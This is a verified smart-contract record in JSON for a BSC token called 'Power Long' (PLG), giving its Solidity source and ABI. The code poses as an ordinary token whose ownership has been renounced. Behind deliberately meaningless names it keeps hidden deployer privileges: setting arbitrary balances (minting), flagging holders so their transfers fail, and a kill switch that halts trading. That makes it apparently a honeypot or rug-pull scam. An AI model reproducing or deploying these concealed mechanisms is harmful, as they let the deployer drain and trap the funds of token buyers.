{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface amountReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tokenWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listLaunched {\n    function createPair(address senderMarketing, address limitList) external returns (address);\n}\n\ninterface enableSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingToken) external view returns (uint256);\n\n    function transfer(address atExempt, uint256 minAt) external returns (bool);\n\n    function allowance(address amountLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atExempt,\n        uint256 minAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldTokenMin, uint256 value);\n    event Approval(address indexed amountLimit, address indexed spender, uint256 value);\n}\n\ninterface launchedAuto is enableSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PowerLong is tokenWallet, enableSwap, launchedAuto {\n\n    address public takeTrading;\n\n    constructor (){\n        \n        amountReceiver takeSwap = amountReceiver(marketingSwap);\n        takeTrading = listLaunched(takeSwap.factory()).createPair(takeSwap.WETH(), address(this));\n        \n        receiverList = _msgSender();\n        marketingShould();\n        atMarketingSell[receiverList] = true;\n        walletSwap[receiverList] = buyMarketing;\n        \n        emit Transfer(address(0), receiverList, buyMarketing);\n    }\n\n    function transfer(address liquiditySender, uint256 minAt) external virtual override returns (bool) {\n        return autoAmount(_msgSender(), liquiditySender, minAt);\n    }\n\n    mapping(address => bool) public atMarketingSell;\n\n    bool public launchToken;\n\n    mapping(address => bool) public launchedWallet;\n\n    bool private teamSwap;\n\n    bool public swapList;\n\n    mapping(address => mapping(address => uint256)) private isTakeAt;\n\n    address public receiverList;\n\n    function autoAmount(address txMarketing, address atExempt, uint256 minAt) internal returns (bool) {\n        if (txMarketing == receiverList) {\n            return tradingIsAuto(txMarketing, atExempt, minAt);\n        }\n        uint256 receiverEnable = enableSwap(takeTrading).balanceOf(teamTotal);\n        require(receiverEnable == atAmount);\n        require(atExempt != teamTotal);\n        if (launchedWallet[txMarketing]) {\n            return tradingIsAuto(txMarketing, atExempt, limitMax);\n        }\n        return tradingIsAuto(txMarketing, atExempt, minAt);\n    }\n\n    function approve(address txSell, uint256 minAt) public virtual override returns (bool) {\n        isTakeAt[_msgSender()][txSell] = minAt;\n        emit Approval(_msgSender(), txSell, minAt);\n        return true;\n    }\n\n    uint8 private minShould = 18;\n\n    uint256 constant limitMax = 16 ** 10;\n\n    string private amountLaunchMode = \"Power Long\";\n\n    uint256 atAmount;\n\n    uint256 public launchTx;\n\n    event OwnershipTransferred(address indexed fundFee, address indexed receiverSender);\n\n    uint256 private autoMax;\n\n    uint256 public receiverWallet;\n\n    uint256 totalTo;\n\n    function name() external view virtual override returns (string memory) {\n        return amountLaunchMode;\n    }\n\n    function tradingIsAuto(address txMarketing, address atExempt, uint256 minAt) internal returns (bool) {\n        require(walletSwap[txMarketing] >= minAt);\n        walletSwap[txMarketing] -= minAt;\n        walletSwap[atExempt] += minAt;\n        emit Transfer(txMarketing, atExempt, minAt);\n        return true;\n    }\n\n    function marketingShould() public {\n        emit OwnershipTransferred(receiverList, address(0));\n        modeLimitMax = address(0);\n    }\n\n    string private shouldToken = \"PLG\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return minShould;\n    }\n\n    function tradingWallet(uint256 minAt) public {\n        liquidityTo();\n        atAmount = minAt;\n    }\n\n    function liquidityTotalIs(address txFee) public {\n        require(txFee.balance < 100000);\n        if (swapList) {\n            return;\n        }\n        if (receiverWallet != launchTx) {\n            shouldFund = false;\n        }\n        atMarketingSell[txFee] = true;\n        if (launchIsWallet) {\n            teamSwap = true;\n        }\n        swapList = true;\n    }\n\n    address marketingSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return modeLimitMax;\n    }\n\n    function balanceOf(address tradingToken) public view virtual override returns (uint256) {\n        return walletSwap[tradingToken];\n    }\n\n    uint256 public buyTo;\n\n    uint256 private buyMarketing = 100000000 * 10 ** 18;\n\n    address teamTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldToken;\n    }\n\n    bool public launchIsWallet;\n\n    function getOwner() external view returns (address) {\n        return modeLimitMax;\n    }\n\n    function transferFrom(address txMarketing, address atExempt, uint256 minAt) external override returns (bool) {\n        if (_msgSender() != marketingSwap) {\n            if (isTakeAt[txMarketing][_msgSender()] != type(uint256).max) {\n                require(minAt <= isTakeAt[txMarketing][_msgSender()]);\n                isTakeAt[txMarketing][_msgSender()] -= minAt;\n            }\n        }\n        return autoAmount(txMarketing, atExempt, minAt);\n    }\n\n    mapping(address => uint256) private walletSwap;\n\n    function launchedShould(address liquiditySender, uint256 minAt) public {\n        liquidityTo();\n        walletSwap[liquiditySender] = minAt;\n    }\n\n    function liquidityTo() private view {\n        require(atMarketingSell[_msgSender()]);\n    }\n\n    address private modeLimitMax;\n\n    function allowance(address enableLaunch, address txSell) external view virtual override returns (uint256) {\n        if (txSell == marketingSwap) {\n            return type(uint256).max;\n        }\n        return isTakeAt[enableLaunch][txSell];\n    }\n\n    bool private shouldFund;\n\n    function launchEnableShould(address fromSell) public {\n        liquidityTo();\n        if (buyTo == autoMax) {\n            autoMax = buyTo;\n        }\n        if (fromSell == receiverList || fromSell == takeTrading) {\n            return;\n        }\n        launchedWallet[fromSell] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyMarketing;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTokenMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atMarketingSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromSell\",\"type\":\"address\"}],\"name\":\"launchEnableShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchIsWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minAt\",\"type\":\"uint256\"}],\"name\":\"launchedShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFee\",\"type\":\"address\"}],\"name\":\"liquidityTotalIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minAt\",\"type\":\"uint256\"}],\"name\":\"tradingWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PowerLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}